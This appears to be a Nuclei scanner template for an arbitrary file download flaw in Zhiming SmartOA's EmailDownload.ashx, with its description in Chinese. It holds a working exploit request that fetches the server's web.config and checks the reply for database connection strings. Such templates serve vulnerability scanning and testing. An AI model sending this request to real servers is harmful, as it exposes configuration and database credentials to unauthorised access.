id: SmartOA-EmailDownload-file-download

info:
  name: 智明 SmartOA EmailDownload.ashx 任意文件下载漏洞
  author: cnaq
  severity: high  
  description: 智明 SmartOA EmailDownload.ashx文件存在任意文件下载漏洞，通过漏洞可下载服务器上的敏感文件，查看敏感信息
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E6%99%BA%E6%98%8EOA/%E6%99%BA%E6%98%8E%20SmartOA%20EmailDownload.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
  tags: SmartOA,file,download 

requests:
  - method: GET
    path:
      - "{{BaseURL}}/file/EmailDownload.ashx?url=~/web.config&name=web.config"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        condition: and
        words:
          - 'xml version'
          - 'database='


    

